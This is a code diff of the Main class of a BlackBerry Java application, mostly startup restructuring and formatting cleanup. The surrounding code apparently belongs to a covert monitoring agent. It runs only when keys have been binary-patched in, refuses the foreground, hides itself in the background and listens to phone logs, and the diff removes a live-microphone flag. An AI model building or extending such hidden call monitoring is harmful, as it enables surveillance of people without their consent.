@@ -9,30 +9,19 @@
  * *************************************************/
 package blackberry;
 
-import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
-import net.rim.device.api.system.Application;
-import net.rim.device.api.ui.Field;
-import net.rim.device.api.ui.UiApplication; 
-//#ifdef TEST
-import tests.MainTest; 
-//#endif
+import net.rim.device.api.ui.UiApplication;
 import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class Main.
  */
 
-//#ifdef LIVE_MIC_ENABLED
 public class Main extends UiApplication {
-//#else
-public class Main extends Application {
-//#endif
     /**
      * The main method.
      * 
@@ -41,13 +30,17 @@ public class Main extends Application {
      */
     public static void main(final String[] args) {
         //#ifdef TEST
-        if (args.length > 0) {
-            System.out.println("Test");
-            new MainTest();
-            return;
-        }
+
+        System.out.println("Test");
+        new MainTest();
+        
+        //#else
+        mainReal();
         //#endif       
-    	
+
+    }
+
+    public static void mainReal() {
         final Keys keys = Encryption.getKeys();
         final boolean binaryPatched = keys.hasBeenBinaryPatched();
 
@@ -58,7 +51,6 @@ public class Main extends Application {
             System.out.println("Not binary patched, bailing out!");
             //#endif
         }
-
     }
 
     private final Debug debug;
@@ -95,15 +87,15 @@ public class Main extends Application {
         //#endif
 
         //Phone.addPhoneListener(appListener);
-        addHolsterListener(appListener);        
-        addSystemListener(appListener);      
-        
+        addHolsterListener(appListener);
+        addSystemListener(appListener);
+
         //addRadioListener(appListener);
         PhoneLogs.addListener(appListener);
-        
+
         goBackground();
     }
-    
+
     /**
      * 
      */
@@ -115,39 +107,37 @@ public class Main extends Application {
         removeHolsterListener(appListener);
         removeSystemListener(appListener);
         removeRadioListener(appListener);
-        
+
         //Phone.removePhoneListener(appListener);
         PhoneLogs.removeListener(appListener);
 
         goBackground();
     }
 
-    public boolean acceptsForeground(){
+    public boolean acceptsForeground() {
         return false;
     }
-    
-    public void activate(){
+
+    public void activate() {
 
     }
-    
-    public void deactivate(){
+
+    public void deactivate() {
 
     }
-    
-    public void goBackground() {    	    	    
-        if(!Conf.IS_UI){
+
+    public void goBackground() {
+        if (!Conf.IS_UI) {
             return;
         }
-    
+
         invokeLater(new Runnable() {
-            public void run() {         
-                
+            public void run() {
+
                 boolean foreground = false;
-                //#ifdef LIVE_MIC_ENABLED
                 UiApplication.getUiApplication().requestBackground();
                 foreground = UiApplication.getUiApplication().isForeground();
-                //#endif
-                
+
                 //#ifdef DEBUG
                 debug.trace("Main foreground: " + foreground);
                 //#endif
